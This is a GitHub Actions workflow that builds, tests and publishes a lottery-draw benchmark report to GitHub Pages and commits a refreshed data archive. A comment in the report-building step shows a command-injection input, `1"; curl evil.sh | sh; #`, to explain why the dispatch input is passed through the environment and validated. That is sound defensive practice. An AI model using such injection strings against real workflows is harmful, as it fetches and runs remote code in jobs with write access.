name: Build & publish report

on:
  # Draw days in the archive since 2012: Tuesday (707) and Saturday (703),
  # plus a Thursday run that appears intermittently (161). Draws are in the
  # evening, Asia/Jerusalem, so rebuild the *following* morning in UTC:
  # Sunday (after Sat), Wednesday (after Tue), Friday (after any Thu).
  schedule:
    - cron: "0 6 * * 0,3,5"
  push:
    branches: [main]
    paths:
      - "bench/**"
      - "scripts/**"
      - "docs/**"
      - "mkdocs.yml"
      # Pulled into the site via pymdownx.snippets, so edits to them change the
      # published pages even though they live at the repo root.
      - "ARCHITECTURES.md"
      - "GUIDE.md"
      - ".github/workflows/report.yml"
  workflow_dispatch:
    inputs:
      n_test:
        description: "Walk-forward window length"
        default: "300"

permissions:
  contents: read

# Never let two publishes race; a queued run supersedes a running one.
concurrency:
  group: pages
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    # Write access is only for committing the refreshed draw archive below.
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4

      - name: Install uv
        uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5
        with:
          enable-cache: true

      - name: Set up Python
        run: uv python install 3.12

      - name: Install dependencies
        # No `|| uv sync` fallback: silently resolving fresh from PyPI on a
        # lockfile mismatch would defeat the pinning it exists to provide.
        run: uv sync --frozen --group docs

      - name: Lint
        run: uv run ruff check bench scripts tests

      - name: Tests
        run: uv run pytest -q

      - name: Build report
        env:
          # Keras/TF are noisy and default to grabbing every core; neither helps here.
          TF_CPP_MIN_LOG_LEVEL: "3"
          PYTHONHASHSEED: "0"
          # Passed through the environment, never interpolated into the shell.
          # `${{ }}` is substituted by the runner before bash sees the line, so a
          # dispatch input like `1"; curl evil.sh | sh; #` would execute in a job
          # that holds contents:write and pushes to main.
          N_TEST: ${{ github.event.inputs.n_test || '300' }}
        run: |
          case "$N_TEST" in
            ''|*[!0-9]*) echo "n_test must be a positive integer, got: $N_TEST" >&2; exit 1 ;;
          esac
          uv run python scripts/build_report.py \
            --refresh \
            --n-test "$N_TEST" \
            --out-dir docs

      # pais.co.il is not reachable from GitHub's runners (connect timeout —
      # likely geo/cloud-IP blocking), so --refresh above silently falls back to
      # the committed archive. Surface that instead of letting green runs hide
      # a stale site: the end date goes in the job summary, with a warning
      # annotation once it is more than a week old.
      - name: Report data freshness
        run: |
          uv run python - <<'EOF' >> "$GITHUB_STEP_SUMMARY"
          import numpy as np
          from datetime import date
          from bench import data
          d = data.load(clean_csv=None)
          last = d.dates[-1].astype("datetime64[D]")
          age = (np.datetime64(date.today()) - last).astype(int)
          print(f"**Archive freshness:** {len(d)} draws, newest {last} ({age} days old)")
          if age > 7:
              print(f"::warning title=Stale draw archive::newest draw is {age} days old; "
                    "pais.co.il is unreachable from CI — refresh locally and push")
          EOF

      # build_report.py writes docs/benchmark/index.html and docs/results.md;
      # MkDocs then renders the whole docs/ tree (copying the standalone report
      # through verbatim) into site/, which is what gets published.
      - name: Build docs site
        run: uv run mkdocs build --strict

      - name: Upload Pages artifact
        uses: actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa # v3
        with:
          path: site

      # The refreshed archive is committed so the report still builds when
      # pais.co.il is unreachable, and so the data history is auditable.
      - name: Commit refreshed draw archive
        if: github.event_name != 'pull_request'
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add input/Orig_IL_lotto.csv input/lotto_IL_modern.csv
          if git diff --cached --quiet; then
            echo "No new draws."
          else
            git commit -m "chore: refresh draw archive [skip ci]"
            git push
          fi

  deploy:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      pages: write
      id-token: write
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4
